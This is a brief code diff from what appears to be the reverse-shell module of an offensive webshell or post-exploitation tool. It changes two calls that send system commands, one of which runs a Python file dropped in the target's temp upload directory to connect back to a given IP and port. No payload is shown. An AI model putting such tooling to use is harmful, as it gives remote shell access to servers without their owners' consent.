@@ -158,7 +158,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
                 if not len(text):
                     print(color.red(f"Failed to write file in {upload_tmp_dir if upload_tmp_dir else 'current'} directory."))
                     return
-                t = Thread(target=send, args=(get_system_code(f"python {upload_tmp_dir}{pyname}"),))
+                t = Thread(target=send, args=(get_system_code(f"python {upload_tmp_dir}{pyname}", False),))
                 t.setDaemon(True)
                 t.start()
                 t2 = Thread(
@@ -167,7 +167,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
                 t2.setDaemon(True)
                 t2.start()
             else:
-                t = Thread(target=send, args=(get_system_code(python),))
+                t = Thread(target=send, args=(get_system_code(python, False),))
                 t.setDaemon(True)
                 t.start()
         else:
